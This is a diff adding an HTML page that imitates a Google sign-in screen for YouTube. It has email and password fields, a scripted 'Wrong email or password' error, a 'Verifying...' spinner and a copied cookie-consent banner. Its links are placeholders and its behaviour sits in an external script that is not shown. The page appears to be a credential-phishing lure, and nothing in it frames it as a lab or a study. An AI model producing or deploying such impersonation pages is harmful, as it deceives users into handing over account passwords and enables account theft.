@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: #f9f9f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            position: relative;
+        }
+        .container {
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 2px 24px rgba(0,0,0,0.15);
+            width: 100%;
+            max-width: 440px;
+            padding: 48px 40px 36px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 24px;
+        }
+        .logo svg {
+            width: 80px;
+            height: 80px;
+        }
+        .logo-text {
+            font-size: 22px;
+            font-weight: 500;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 32px;
+        }
+        .google-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+        .google-logo span {
+            font-size: 20px;
+            color: #5f6368;
+        }
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+            background: #fff;
+        }
+        .input-group input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.15);
+        }
+        .input-group label {
+            position: absolute;
+            left: 16px;
+            top: 14px;
+            color: #5f6368;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.2s;
+            background: #fff;
+            padding: 0 4px;
+        }
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: -10px;
+            left: 12px;
+            font-size: 12px;
+            color: #1a73e8;
+        }
+        .input-group input::placeholder {
+            color: transparent;
+        }
+        .forgot-link {
+            text-align: left;
+            margin-bottom: 32px;
+        }
+        .forgot-link a {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .forgot-link a:hover {
+            background: #e8f0fe;
+            padding: 4px 8px;
+            border-radius: 4px;
+        }
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .create-link {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .create-link:hover {
+            background: #e8f0fe;
+            padding: 8px 12px;
+            border-radius: 4px;
+        }
+        .next-btn {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 12px 28px;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .next-btn:hover {
+            background: #1765cc;
+        }
+        .next-btn:disabled {
+            background: #9aa0a6;
+            cursor: not-allowed;
+        }
+        .error-msg {
+            color: #d93025;
+            font-size: 13px;
+            margin-bottom: 12px;
+            display: none;
+            text-align: left;
+        }
+        .error-msg.active { display: block; }
+        .loading {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin: 16px 0;
+            color: #5f6368;
+            font-size: 14px;
+        }
+        .loading.active { display: flex; }
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid #e8e8e8;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .not-you {
+            margin-top: 24px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        .not-you a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        /* Cookie Consent Banner */
+        .cookie-banner {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #fff;
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.15);
+            z-index: 9999;
+            padding: 24px;
+            display: none;
+            border-top: 1px solid #e0e0e0;
+        }
+        .cookie-banner.active { display: block; }
+        .cookie-banner-inner {
+            max-width: 900px;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: flex-start;
+            gap: 20px;
+        }
+        .cookie-content {
+            flex: 1;
+            min-width: 280px;
+        }
+        .cookie-content h3 {
+            font-size: 16px;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .cookie-content p {
+            font-size: 13px;
+            color: #5f6368;
+            line-height: 1.5;
+        }
+        .cookie-content p a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .cookie-actions {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            flex-wrap: wrap;
+            padding-top: 8px;
+        }
+        .cookie-btn {
+            padding: 10px 24px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            border: none;
+            transition: background 0.2s;
+        }
+        .cookie-btn.accept {
+            background: #1a73e8;
+            color: #fff;
+        }
+        .cookie-btn.accept:hover {
+            background: #1765cc;
+        }
+        .cookie-btn.customize {
+            background: transparent;
+            color: #1a73e8;
+            border: 1px solid #dadce0;
+        }
+        .cookie-btn.customize:hover {
+            background: #f1f3f4;
+        }
+        .cookie-btn.reject {
+            background: transparent;
+            color: #5f6368;
+            border: 1px solid #dadce0;
+        }
+        .cookie-btn.reject:hover {
+            background: #f1f3f4;
+        }
+
+        /* Customize Cookie Modal */
+        .cookie-modal {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.5);
+            z-index: 10000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+        .cookie-modal.active { display: flex; }
+        .cookie-modal-content {
+            background: #fff;
+            border-radius: 12px;
+            padding: 32px;
+            max-width: 560px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .cookie-modal-content h2 {
+            font-size: 20px;
+            margin-bottom: 16px;
+            color: #1a1a1a;
+        }
+        .cookie-option {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+            border-bottom: 1px solid #eee;
+        }
+        .cookie-option:last-child { border-bottom: none; }
+        .cookie-option label {
+            font-size: 14px;
+            color: #3c4043;
+        }
+        .cookie-option small {
+            display: block;
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 4px;
+        }
+        .toggle {
+            width: 44px;
+            height: 24px;
+            background: #ccc;
+            border-radius: 12px;
+            cursor: pointer;
+            position: relative;
+            transition: background 0.3s;
+            flex-shrink: 0;
+        }
+        .toggle.active { background: #1a73e8; }
+        .toggle::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: #fff;
+            border-radius: 50%;
+            top: 2px;
+            left: 2px;
+            transition: transform 0.3s;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        .toggle.active::after {
+            transform: translateX(20px);
+        }
+        .cookie-modal-actions {
+            display: flex;
+            gap: 12px;
+            justify-content: flex-end;
+            margin-top: 24px;
+        }
+        @media (max-width: 480px) {
+            .container { padding: 24px 16px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Main Login Card -->
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" fill="#FF0000" xmlns="http://www.w3.org/2000/svg">
+                <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
+            </svg>
+        </div>
+        <div class="google-logo">
+            <svg width="24" height="24" viewBox="0 0 24 24">
+                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
+                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+            </svg>
+            <span>Sign in with Google</span>
+        </div>
+        <div class="logo-text">Sign in</div>
+        <div class="subtitle">to continue to YouTube</div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="email" placeholder=" " required autocomplete="off">
+                <label for="email">Email or phone</label>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder=" " required>
+                <label for="password">Enter your password</label>
+            </div>
+
+            <div class="error-msg" id="errorMsg">Wrong email or password. Try again.</div>
+
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <span>Verifying...</span>
+            </div>
+
+            <div class="forgot-link">
+                <a href="#">Forgot email?</a>
+            </div>
+
+            <div class="not-you">
+                Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a>
+            </div>
+
+            <div class="actions" style="margin-top: 32px;">
+                <a href="#" class="create-link">Create account</a>
+                <button type="submit" class="next-btn" id="loginBtn">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- Cookie Consent Banner -->
+    <div class="cookie-banner" id="cookieBanner">
+        <div class="cookie-banner-inner">
+            <div class="cookie-content">
+                <h3>
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="#5f6368">
+                        <path d="M21.96 11.22C21.57 7.01 17.76 3 13.56 3c-1.22 0-2.38.27-3.43.75C8.94 6.2 6.2 8.94 3.75 10.13c-.48 1.05-.75 2.21-.75 3.43 0 4.2 4.01 8.01 8.22 8.4 1.39.12 2.74-.12 3.99-.72 2.69-1.53 4.65-4.09 5.55-7.12.32-.97.52-2 .57-3.08.24-.52.43-1.06.63-1.62z"/>
+                    </svg>
+                    Before you continue to YouTube
+                </h3>
+                <p>
+                    YouTube uses cookies and data to:
+                    <br>• Deliver and maintain Google services
+                    <br>• Track outages and protect against spam, fraud, and abuse
+                    <br>• Measure audience engagement and site statistics
+                    <br><br>
+                    If you agree, we'll also use cookies and data to:
+                    <br>• Improve the quality of our services and develop new ones
+                    <br>• Deliver and measure the effectiveness of ads
+                    <br>• Show personalized content and ads
+                    <br><br>
+                    <a href="#">Learn more</a> about how we use cookies.
+                </p>
+            </div>
+            <div class="cookie-actions">
+                <button class="cookie-btn reject" id="rejectCookies">Reject all</button>
+                <button class="cookie-btn customize" id="customizeCookies">Customize</button>
+                <button class="cookie-btn accept" id="acceptCookies">Accept all</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Cookie Customize Modal -->
+    <div class="cookie-modal" id="cookieModal">
+        <div class="cookie-modal-content">
+            <h2>Customize cookie settings</h2>
+            <p style="font-size:13px;color:#5f6368;margin-bottom:16px;">
+                YouTube uses cookies to improve your experience and show personalized content and ads.
+                You can choose which types of cookies to accept.
+            </p>
+
+            <div class="cookie-option">
+                <div>
+                    <label><strong>Necessary cookies</strong></label>
+                    <small>Always active — required for the service to function properly.</small>
+                </div>
+                <div class="toggle active" style="opacity:0.5;cursor:not-allowed;"></div>
+            </div>
+
+            <div class="cookie-option">
+                <div>
+                    <label><strong>Functional cookies</strong></label>
+                    <small>Enable enhanced functionality and personalization.</small>
+                </div>
+                <div class="toggle" data-cookie="functional" id="toggleFunctional"></div>
+            </div>
+
+            <div class="cookie-option">
+                <div>
+                    <label><strong>Analytics cookies</strong></label>
+                    <small>Help us understand how visitors interact with YouTube.</small>
+                </div>
+                <div class="toggle" data-cookie="analytics" id="toggleAnalytics"></div>
+            </div>
+
+            <div class="cookie-option">
+                <div>
+                    label><strong>Advertising cookies</strong></label>
+                    <small>Used to deliver relevant ads and measure ad performance.</small>
+                </div>
+                <div class="toggle" data-cookie="advertising" id="toggleAdvertising"></div>
+            </div>
+
+            <div class="cookie-modal-actions">
+                <button class="cookie-btn reject" id="modalReject">Reject all</button>
+                <button class="cookie-btn accept" id="modalConfirm">Confirm choices</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
